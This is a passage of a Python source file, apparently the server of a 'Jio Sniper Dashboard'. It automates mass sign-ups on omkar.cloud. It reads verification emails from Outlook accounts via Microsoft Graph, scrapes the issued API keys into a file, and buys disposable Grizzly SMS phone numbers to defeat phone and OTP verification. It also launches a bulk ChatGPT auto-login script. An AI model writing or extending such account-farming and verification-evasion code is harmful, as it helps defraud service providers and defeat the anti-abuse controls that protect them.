                raise Exception("No access token returned")
                
            # Poll for the verification email (up to 2 minutes)
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Polling Inbox for Omkar verification email...', 'level': 'info'}, to=sid)
            verification_link = None
            for _ in range(24):
                async with state.http_session.get(
                    "https://graph.microsoft.com/v1.0/me/messages?$top=5",
                    headers={"Authorization": f"Bearer {access_token}"}
                ) as resp:
                    if resp.status == 200:
                        msgs = await resp.json()
                        for msg in msgs.get("value", []):
                            subject = msg.get("subject", "").lower()
                            if "verification" in subject or "verify" in subject or "omkar" in subject:
                                body = msg.get("body", {}).get("content", "")
                                # Look for the brevo tracking link (domain changes frequently, e.g. sendibt2.com, sendibt3.com)
                                match = re.search(r'(https://[a-zA-Z0-9.-]+sendibt[0-9]\.com/tr/cl/[^\s"\'<>]+)', body)
                                if match:
                                    verification_link = match.group(1)
                                    break
                                # Fallback if /tr/cl/ isn't used
                                match_any = re.search(r'(https://[a-zA-Z0-9.-]+sendibt[0-9]\.com/[^\s"\'<>]+)', body)
                                if match_any:
                                    verification_link = match_any.group(1)
                                    break
                    if verification_link:
                        break
                await asyncio.sleep(5)
                
            if not verification_link:
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Verification email not found after 2 mins.', 'level': 'error'}, to=sid)
                raise Exception("Email timeout")
                
            # Step 3: Verify and Extract Key
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Found link! Verifying...', 'level': 'info'}, to=sid)
            try:
                await page.goto(verification_link, wait_until="domcontentloaded", timeout=30000)
            except Exception as e:
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Redirect took too long, proceeding anyway...', 'level': 'warn'}, to=sid)
                
            await asyncio.sleep(3)
            
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Fetching API Key...', 'level': 'info'}, to=sid)
            await page.goto("https://www.omkar.cloud/api-key", wait_until="domcontentloaded", timeout=30000)
            await asyncio.sleep(2)
            
            # Check if we were redirected to sign-in page
            if "sign-in" in page.url:
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Redirected to sign-in, manually logging in...', 'level': 'warn'}, to=sid)
                try:
                    await page.locator('input[type="email"]').press_sequentially(email, delay=30)
                    await page.locator('input[type="password"]').press_sequentially(omkar_pass, delay=30)
                    await page.locator('button[type="submit"]').click(force=True)
                    await asyncio.sleep(4)
                    
                    # Ensure we go to the API key page after login
                    await page.goto("https://www.omkar.cloud/api-key", wait_until="domcontentloaded", timeout=30000)
                    await asyncio.sleep(2)
                except Exception as e:
                    await sio.emit('omkar_gen_log', {'msg': f'[{email}] Manual login failed: {str(e)[:100]}', 'level': 'error'}, to=sid)
            
            # The key is typically in an input field or a code block. We'll look for ok_...
            content = await page.content()
            match = re.search(r'(ok_[a-f0-9]{32})', content)
            
            if match:
                api_key = match.group(1)
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] 🎉 Extracted Key: {api_key}', 'level': 'success'}, to=sid)
                
                # Append to file
                with open(omkar_txt_path, "a") as f:
                    f.write(f"{api_key}\n")
                    
                # --- NEW LOGIC: Automate Phone Verification with Grizzly SMS ---
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Navigating to Phone Verification...', 'level': 'info'}, to=sid)
                await page.goto("https://www.omkar.cloud/account/verify-phone", wait_until="domcontentloaded", timeout=30000)
                await asyncio.sleep(2)
                
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Buying number from Grizzly SMS (Chile/Indonesia)...', 'level': 'info'}, to=sid)
                tzid, local_number, country_name, full_number = await buy_grizzly_number()
                
                if not tzid:
                    await sio.emit('omkar_gen_log', {'msg': f'[{email}] Failed to buy Grizzly number! Leaving browser OPEN for you. Key: {api_key}', 'level': 'warn'}, to=sid)
                    context = None
                else:
                    await sio.emit('omkar_gen_log', {'msg': f'[{email}] Bought {country_name} number: {full_number}. Filling form...', 'level': 'success'}, to=sid)
                    try:
                        # 1. Select Country
                        await page.locator('[data-test-subj="comboBoxSearchInput"]').fill(country_name)
                        await asyncio.sleep(1)
                        # Press ArrowDown to highlight the option, then Enter
                        await page.keyboard.press("ArrowDown")
                        await asyncio.sleep(0.5)
                        await page.keyboard.press("Enter")
                        await asyncio.sleep(1)
                        # Fallback: try to explicitly click it if the dropdown is still open
                        try:
                            await page.locator(f'button[role="option"]:has-text("{country_name}")').click(timeout=2000)
                        except:
                            pass
                        await asyncio.sleep(1)
                        
                        # 2. Enter Phone Number
                        await page.locator('input[name="phone"]').fill(local_number)
                        await asyncio.sleep(1)
                        await page.keyboard.press("Enter")
                        
                        # Wait for OTP input to appear
                        try:
                            await page.wait_for_selector('input[name="code"]', timeout=20000)
                            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Waiting up to 65s for OTP...', 'level': 'info'}, to=sid)
                            
                            otp = await poll_grizzly_otp(tzid, timeout=65)
                            
                            if not otp:
                                await sio.emit('omkar_gen_log', {'msg': f'[{email}] No OTP yet. Clicking "Resend code" and waiting 60s more...', 'level': 'warn'}, to=sid)
                                await page.locator('span:has-text("Resend code")').click()
                                otp = await poll_grizzly_otp(tzid, timeout=60)
                                
                            if otp:
                                await sio.emit('omkar_gen_log', {'msg': f'[{email}] 🎉 OTP Received: {otp}! Submitting...', 'level': 'success'}, to=sid)
                                os.system("afplay /System/Library/Sounds/Glass.aiff &")
                                await page.locator('input[name="code"]').fill(otp)
                                await asyncio.sleep(1)
                                await page.keyboard.press("Enter")
                                await asyncio.sleep(5) # Wait for success redirect or message
                                
                                # Mark as VERIFIED in omkar.txt
                                lines = []
                                with open(omkar_txt_path, "r") as f:
                                    lines = f.readlines()
                                with open(omkar_txt_path, "w") as f:
                                    for line in lines:
                                        if api_key in line and "VERIFIED" not in line:
                                            f.write(f"{line.strip()} - VERIFIED\n")
                                        else:
                                            f.write(line)
                                            
                                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Phone verification COMPLETE! Account ready.', 'level': 'success'}, to=sid)
                                # Let context close naturally
                            else:
                                await sio.emit('omkar_gen_log', {'msg': f'[{email}] OTP never arrived. Cancelling number for refund.', 'level': 'error'}, to=sid)
                                await cancel_grizzly_number(tzid)
                                context = None # Leave browser open for manual debug
                        except Exception as e:
                            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Error during OTP submission: {str(e)[:100]}. Cancelling number.', 'level': 'error'}, to=sid)
                            await cancel_grizzly_number(tzid)
                            context = None
                    except Exception as e:
                        await sio.emit('omkar_gen_log', {'msg': f'[{email}] UI Error filling phone form: {str(e)[:100]}. Cancelling number.', 'level': 'error'}, to=sid)
                        await cancel_grizzly_number(tzid)
                        context = None
                # -----------------------------------------------------------------
            else:
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Could not find ok_ key! Browser kept open. Password: {omkar_pass}', 'level': 'error'}, to=sid)
                context = None # Prevent finally block from closing it
                
        except Exception as e:
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Error: {str(e)[:150]}', 'level': 'error'}, to=sid)
            # If there's an error, maybe keep it open too?
            # Let's keep it open for debugging
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Browser kept open for debugging. Password: {omkar_pass}', 'level': 'warn'}, to=sid)
            context = None
        finally:
            if context:
                await context.close()

async def process_omkar_generation(sid, accounts):
    omkar_txt_path = os.path.join(DATA_DIR, "omkar.txt")
    
    if not state.pw:
        from playwright.async_api import async_playwright
        state.pw = await async_playwright().start()
        state.browser = await state.pw.chromium.launch(headless=False)
        
    # Limit concurrency: max 3 accounts doing Grizzly phone verification at once
    sem = asyncio.Semaphore(3)
    
    tasks = []
    for i, account_line in enumerate(accounts):
        tasks.append(asyncio.create_task(_process_single_omkar_account(sid, account_line, omkar_txt_path, sem, stagger_delay=i * 8)))
        
    await asyncio.gather(*tasks)
    
    await sio.emit('omkar_gen_log', {'msg': 'Automation sequence completed.', 'level': 'success'}, to=sid)
    await sio.emit('omkar_gen_done', {}, to=sid)

@sio.on('stop_chatgpt_login')
async def on_stop_chatgpt_login(sid):
    state.chatgpt_login_stop = True
    await sio.emit('chatgpt_log', {'msg': 'Stopping login process...', 'level': 'warn'}, to=sid)

@sio.on('start_chatgpt_login')
async def on_start_chatgpt_login(sid, data):
    num_tabs = data.get('num_tabs', 3)
    state.chatgpt_login_stop = False
    await sio.emit('chatgpt_log', {'msg': f'Starting automation for {num_tabs} tabs...', 'level': 'info'}, to=sid)
    asyncio.create_task(process_chatgpt_login(sid, num_tabs))

async def process_chatgpt_login(sid, num_tabs):
    script_path = os.path.join(PROJECT_DIR, "outlook-chatgpt-auto-login", "chatgpt_web_login.py")
    
    if getattr(state, "chatgpt_login_stop", False):
        await sio.emit('chatgpt_log', {'msg': 'Generation stopped by user.', 'level': 'warn'}, to=sid)
        return
        
    await sio.emit('chatgpt_log', {'msg': f'Launching chatgpt_web_login.py for {num_tabs} tabs...', 'level': 'info'}, to=sid)
    
    try:
        # We launch the python script asynchronously using sys.executable to stay inside the venv
        process = await asyncio.create_subprocess_exec(
            sys.executable, script_path,
            env={**os.environ, "NUM_TABS": str(num_tabs)},
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        await sio.emit('chatgpt_log', {'msg': f'Script launched (PID: {process.pid}). Please wait for it to complete.', 'level': 'success'}, to=sid)
        
    except Exception as e:
        await sio.emit('chatgpt_log', {'msg': f'Error launching script: {e}', 'level': 'error'}, to=sid)
        
    await sio.emit('chatgpt_log', {'msg': 'Automation sequence completed.', 'level': 'success'}, to=sid)
    await sio.emit('chatgpt_login_done', {}, to=sid)

# ─── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("🚀 Jio Sniper Dashboard v2.0 — http://localhost:8000")
    uvicorn.run(sio_app, host="0.0.0.0", port=8000, log_level="warning")
